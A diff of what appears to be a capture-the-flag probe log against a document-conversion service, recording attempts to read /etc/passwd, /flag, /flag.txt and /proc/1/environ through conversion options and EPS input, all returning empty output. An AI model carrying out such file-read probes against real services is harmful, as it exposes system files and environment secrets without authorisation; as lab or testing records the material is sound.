@@ -1,90 +1,16 @@
 
-========================= CONVERT /etc/passwd TO txt FIELDS {'infilterOptions': 'UpdateDocMode=1'} BYTES 1668
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:29:51
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
+========================= EPS CONVERT /etc/passwd
+STATUS 200 TYPE application/octet-stream BYTES 6461
+PDF_TEXT 
 
+========================= EPS CONVERT /flag
+STATUS 200 TYPE application/octet-stream BYTES 6461
+PDF_TEXT 
 
-RESPONSE ﻿
+========================= EPS CONVERT /flag.txt
+STATUS 200 TYPE application/octet-stream BYTES 6461
+PDF_TEXT 
 
-
-========================= CONVERT /flag TO txt FIELDS {'infilterOptions': 'UpdateDocMode=1'} BYTES 1666
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:29:53
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
-
-
-RESPONSE ﻿
-
-
-========================= CONVERT /flag.txt TO txt FIELDS {'infilterOptions': 'UpdateDocMode=1'} BYTES 1668
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:29:54
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
-
-
-RESPONSE ﻿
-
-
-========================= CONVERT /etc/passwd TO txt FIELDS {'infilterOptions': 'UpdateDocMode=3'} BYTES 1668
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:29:55
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
-
-
-RESPONSE ﻿
-
-
-========================= CONVERT /flag TO txt FIELDS {'infilterOptions': 'UpdateDocMode=3'} BYTES 1666
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:30:00
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
-
-
-RESPONSE ﻿
-
-
-========================= CONVERT /flag.txt TO txt FIELDS {'infilterOptions': 'UpdateDocMode=3'} BYTES 1668
-STATUS 200 HEADERS Cache-Control: max-age=11059200
-Content-Disposition: attachment; filename="probe.txt"
-Content-Length: 4
-Content-Type: application/octet-stream
-Date: Sat, 31 Oct 2026 13:30:02
-Etag: "cc5614c67e"
-Server: 
-X-Content-Type-Options: nosniff
-Connection: close
-
-
-RESPONSE ﻿
-
+========================= EPS CONVERT /proc/1/environ
+STATUS 200 TYPE application/octet-stream BYTES 6461
+PDF_TEXT 
